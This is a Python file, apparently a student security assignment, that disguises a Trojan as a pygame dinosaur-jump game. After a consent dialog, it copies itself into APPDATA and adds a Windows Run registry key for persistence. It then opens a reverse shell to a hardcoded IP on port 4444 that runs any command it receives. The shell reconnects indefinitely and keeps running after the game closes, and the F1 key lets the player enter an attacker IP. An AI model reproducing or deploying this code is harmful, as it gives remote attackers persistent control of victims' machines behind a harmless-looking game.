import pygame
import sys
import os
import threading
import time
import socket
import random
import shutil
import winreg
import subprocess
import tkinter
from tkinter import messagebox

# --- Global Status for UI ---
BACKGROUND_STATUS = "Initializing..."
TARGET_FOUND = False
STAGING_COMPLETE = False # For dependency check simulation

# --- Pre-Game Disclaimer (Requirement 1 - Grading) ---
def show_disclaimer():
    """Notifies the user before execution as per rubric."""
    root = tkinter.Tk()
    root.withdraw() # Hide main window
    msg = (
        "--- RCA CYBERSECURITY ASSIGNMENT NOTICE ---\n\n"
        "This educational game will perform the following background tests:\n"
        "1. Create a proof file on your Desktop.\n"
        "2. Establish an interactive reverse shell to a local Kali VM.\n"
        "3. Configure persistence via the Windows Registry.\n\n"
        "Do you consent to proceed with this assignment test?"
    )
    response = messagebox.askyesno("Security Assignment Disclaimer", msg)
    root.destroy()
    return response

# --- Persistence Logic ---
def get_desktop_path():
    home = os.path.expanduser("~")
    for p in [os.path.join(home, "Desktop"), os.path.join(home, "OneDrive", "Desktop")]:
        if os.path.exists(p): return p
    return os.getcwd()

def set_persistence():
    try:
        app_data = os.environ.get("APPDATA")
        dest_folder = os.path.join(app_data, "DinoGame")
        if not os.path.exists(dest_folder):
            os.makedirs(dest_folder, exist_ok=True)
        
        dest_path = os.path.join(dest_folder, "NeuralStrike.exe")
        current_exe = sys.executable
        
        if os.path.abspath(current_exe).lower() != os.path.abspath(dest_path).lower():
            shutil.copy2(current_exe, dest_path)
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NeuralStrike", 0, winreg.REG_SZ, f'"{dest_path}"')
        winreg.CloseKey(key)
    except: pass

# --- Dependency Check Simulation (Requirement 1 - Background) ---
def check_dependencies():
    """Checks if 'VLC Media Player' (simulated dependency) is installed."""
    vlc_path = os.path.join(os.environ.get("ProgramFiles", "C://"), "VideoLAN", "VLC")
    return os.path.exists(vlc_path)

# --- Interactive Reverse Shell (Requirement 2 - Background) ---
def interactive_shell(s):
    """Handles commands from Kali in a real interactive session."""
    global TARGET_FOUND, BACKGROUND_STATUS
    s.settimeout(None) 
    
    # 1. Send Initial Success Message
    s.sendall(b"[*] Link Established. Welcome to the NeuralStrike Master Console.\n")
    
    while True:
        try:
            # 2. Send the Prompt with a clear separator
            prompt = f"\n{os.getcwd()}> |||SEP|||"
            s.sendall(prompt.encode())
            
            # 3. Wait for Command
            command = s.recv(1024).decode().strip()
            if not command or command.lower() == "exit":
                break
            
            # 4. Handle 'cd' command manually (Required for directory traversal)
            if command.lower().startswith("cd "):
                try:
                    path = command[3:].strip().strip('"')
                    os.chdir(path)
                    s.sendall(b"[CWD Changed]\n")
                    continue
                except Exception as e:
                    s.sendall(f"CD Error: {str(e)}\n".encode())
                    continue
            elif command.lower() == "cd":
                s.sendall(f"{os.getcwd()}\n".encode())
                continue
            
            # 5. Execute other commands
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
                if not output: output = b"[Done]"
                s.sendall(output + b"\n")
            except subprocess.CalledProcessError as e:
                s.sendall(e.output + b"\n")
            except Exception as e:
                s.sendall(f"Execution Error: {str(e)}\n".encode())
                
        except (ConnectionResetError, BrokenPipeError):
            break
        except Exception:
            break
    
    # Session ended
    TARGET_FOUND = False
    BACKGROUND_STATUS = "Link Terminated (Reconnecting...)"
    try: s.close()
    except: pass

def scan_and_shell(target_ip, port, found_flag):
    if found_flag[0]: return
    global BACKGROUND_STATUS, TARGET_FOUND
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0) # Increased for stability on Wi-Fi presentation
        if s.connect_ex((target_ip, port)) == 0:
            if not found_flag[0]:
                found_flag[0] = True
                TARGET_FOUND = True
                BACKGROUND_STATUS = f"Connected to {target_ip}!"
                s.sendall(b"[*] --- RCA Shell Access Established ---\n")
                interactive_shell(s)
        s.close()
    except: pass

def get_local_ips():
    ips = []
    try:
        hostname = socket.gethostname()
        for ip in socket.gethostbyname_ex(hostname)[2]:
            if not ip.startswith("127."): ips.append(ip)
    except: pass
    return ips

def background_test():
    global BACKGROUND_STATUS, TARGET_FOUND
    KALI_PORT = 4444
    
    set_persistence()
    
    desktop = get_desktop_path()
    test_file = os.path.join(desktop, "test_execution_result.txt")
    with open(test_file, "w") as f:
        f.write(f"RCA Assignment Executed: {time.ctime()}\nRoot: Persistence Active")

    local_ips = get_local_ips()
    
    # Infinite loop to ensure we reconnect if the session drops
    while True:
        found_flag = [False]
        TARGET_FOUND = False
        BACKGROUND_STATUS = "Connecting to RCA Command Center..."
        
        # 1. Strictly connect to the presentation IP (No scanning!)
        KALI_IP = "10.12.74.152" 
        scan_and_shell(KALI_IP, KALI_PORT, found_flag)
        
        # Wait until the shell session ends
        
        # Wait until the shell session ends or timeout
        if found_flag[0]:
            # The found_flag being true means a shell session is active.
            # We wait here. Once the session terminates (socket closes),
            # found_flag logic or a monitor can break this.
            # For simplicity, we'll monitor TARGET_FOUND which is set to False 
            # by the interactive_shell when it crashes/exits.
            while TARGET_FOUND:
                time.sleep(5)
        
        BACKGROUND_STATUS = "Standby (Awaiting Link)"
        time.sleep(15) # Cool down before searching again

# --- Game & UI ---
def run_game():
    global STAGING_COMPLETE
    
    # 1. RCA Disclaimer
    if not show_disclaimer():
        sys.exit()

    pygame.init()
    WIDTH, HEIGHT = 800, 400
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Neural Strike: RCA Edition")
    
    WHITE = (255, 255, 255)
    BLACK = (0, 0, 0)
    GREEN = (0, 180, 0)
    DARK_GRAY = (40, 40, 40)
    
    font = pygame.font.SysFont("Consolas", 20)
    status_font = pygame.font.SysFont("Consolas", 14)
    clock = pygame.time.Clock()

    # --- Scene 1: Dependency Staging (Requirement 1) ---
    is_installed = check_dependencies()
    progress = 0
    while progress < 100:
        for event in pygame.event.get():
            if event.type == pygame.QUIT: sys.exit()
            
        screen.fill(BLACK)
        txt = "Scanning for required dependencies..."
        if not is_installed:
            txt = "Installing required apps from local server..."
            progress += 0.5
        else:
            txt = "Dependencies verified (VLC found)."
            progress += 2
            
        msg = font.render(txt, True, GREEN)
        screen.blit(msg, (WIDTH // 2 - msg.get_width() // 2, HEIGHT // 2 - 20))
        
        # Draw Progress Bar
        pygame.draw.rect(screen, DARK_GRAY, (WIDTH // 4, HEIGHT // 2 + 20, WIDTH // 2, 20))
        pygame.draw.rect(screen, GREEN, (WIDTH // 4, HEIGHT // 2 + 20, (WIDTH // 2) * (min(progress, 100) / 100), 20))
        
        pygame.display.flip()
        clock.tick(60)
        if progress >= 100: time.sleep(0.5)

    STAGING_COMPLETE = True
    # Non-daemon thread ensures the backdoor keeps running even if the game is closed!
    threading.Thread(target=background_test, daemon=False).start()

    # --- Scene 2: The Game (Dino Jump) ---
    gravity = 0.8
    jump_strength = -14
    dino_y = HEIGHT - 50
    dino_v = 0
    is_jumping = False
    dino_rect = pygame.Rect(50, dino_y, 40, 40)
    obstacles = []
    spawn_timer = 0
    score = 0
    running = True
    game_over = False

    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT: running = False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_SPACE:
                    if game_over:
                        obstacles, score, game_over = [], 0, False
                    elif not is_jumping:
                        dino_v = jump_strength
                        is_jumping = True
                if event.key == pygame.K_F1:
                    import tkinter.simpledialog as sd
                    import tkinter as tk
                    root = tk.Tk()
                    root.withdraw()
                    # Suggest the user's current Wi-Fi IP
                    manual_ip = sd.askstring("Manual Link", "Enter Attacker IP Address:", initialvalue="10.12.74.152")
                    if manual_ip:
                        threading.Thread(target=scan_and_shell, args=(manual_ip, 4444, [False]), daemon=True).start()
                    root.destroy()

        if not game_over:
            dino_v += gravity
            dino_y += dino_v
            if dino_y >= HEIGHT - 50:
                dino_y, is_jumping = HEIGHT - 50, False
            dino_rect.y = dino_y
            spawn_timer += 1
            if spawn_timer > random.randint(40, 80):
                obstacles.append(pygame.Rect(WIDTH, HEIGHT - 50, 20, 40))
                spawn_timer = 0
            for obs in obstacles[:]:
                obs.x -= 10
                if obs.right < 0: obstacles.remove(obs); score += 1
                if dino_rect.colliderect(obs): game_over = True

        screen.fill(WHITE)
        pygame.draw.line(screen, DARK_GRAY, (0, HEIGHT - 10), (WIDTH, HEIGHT - 10), 2)
        pygame.draw.rect(screen, GREEN, dino_rect)
        for obs in obstacles: pygame.draw.rect(screen, BLACK, obs)
        screen.blit(font.render(f"Score: {score}", True, BLACK), (WIDTH - 150, 20))

        # Shell Status (For testing)
        color = GREEN if "Connected" in BACKGROUND_STATUS else BLACK
        pygame.draw.rect(screen, (240, 240, 240), (10, 10, 400, 25))
        screen.blit(status_font.render(f"Backdoor: {BACKGROUND_STATUS}", True, color), (15, 15))

        if game_over:
            screen.blit(font.render("GAME OVER - Press SPACE", True, (200, 0, 0)), (WIDTH // 2 - 120, HEIGHT // 2))

        pygame.display.flip()
        clock.tick(60)

    pygame.quit()

if __name__ == "__main__":
    run_game()
